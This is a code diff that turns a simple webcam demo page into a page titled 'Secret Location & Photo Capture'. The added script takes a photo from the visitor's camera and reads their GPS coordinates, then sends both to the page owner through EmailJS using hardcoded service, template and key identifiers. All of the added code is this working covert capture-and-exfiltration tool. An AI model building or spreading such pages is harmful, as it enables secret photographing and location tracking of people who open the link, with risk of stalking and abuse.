@@ -1,38 +1,67 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Take a Photo</title>
-</head>
-<body>
-  <h2>Take a Photo</h2>
-  <video id="video" autoplay></video>
-  <br>
-  <button id="snap">Take Photo</button>
-  <canvas id="canvas" style="display:none;"></canvas>
+  <head>
+    <title>Secret Capture</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+      emailjs.init("vyxyeBFTfSi_ISmNG"); // Your Public Key
 
-  <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const context = canvas.getContext('2d');
-    const snap = document.getElementById('snap');
+      // Send location only
+      function sendLocationOnly() {
+        if (!navigator.geolocation) {
+          alert("Geolocation not supported");
+          return;
+        }
 
-    // Ask for camera access
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
-      });
+        navigator.geolocation.getCurrentPosition(async (position) => {
+          const message = `Location Only:\nLatitude: ${position.coords.latitude}\nLongitude: ${position.coords.longitude}`;
 
-    snap.onclick = () => {
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          await emailjs.send("service_gkkpt4w", "template_96dsagv", {
+            message: message,
+          });
 
-      const image = canvas.toDataURL('image/png');
+          alert("Location sent successfully!");
+        });
+      }
 
-      // You can update this to send to a server or webhook
-      console.log("Image ready to be sent!");
-      alert("Image captured — now send it manually or update the code to send it automatically.");
-    };
-  </script>
-</body>
+      // Take picture and send with location
+      async function captureAndSend() {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          const video = document.createElement("video");
+          video.srcObject = stream;
+          await video.play();
+
+          // Give video time to load
+          await new Promise((res) => setTimeout(res, 1000));
+
+          const canvas = document.createElement("canvas");
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext("2d").drawImage(video, 0, 0);
+          const imageBase64 = canvas.toDataURL("image/png");
+
+          stream.getTracks().forEach((track) => track.stop());
+
+          navigator.geolocation.getCurrentPosition(async (position) => {
+            const message = `Picture Taken With Location:\nLatitude: ${position.coords.latitude}\nLongitude: ${position.coords.longitude}`;
+
+            await emailjs.send("service_gkkpt4w", "template_96dsagv", {
+              message: message,
+              image: imageBase64,
+            });
+
+            alert("Picture + location sent!");
+          });
+        } catch (err) {
+          alert("Error: " + err.message);
+        }
+      }
+    </script>
+  </head>
+  <body style="text-align: center; padding: 40px; font-family: Arial;">
+    <h2>Secret Location & Photo Capture</h2>
+    <button onclick="sendLocationOnly()" style="padding: 10px 20px; margin: 10px;">Send Location Only</button>
+    <button onclick="captureAndSend()" style="padding: 10px 20px; margin: 10px;">Take Picture & Send</button>
+  </body>
 </html>
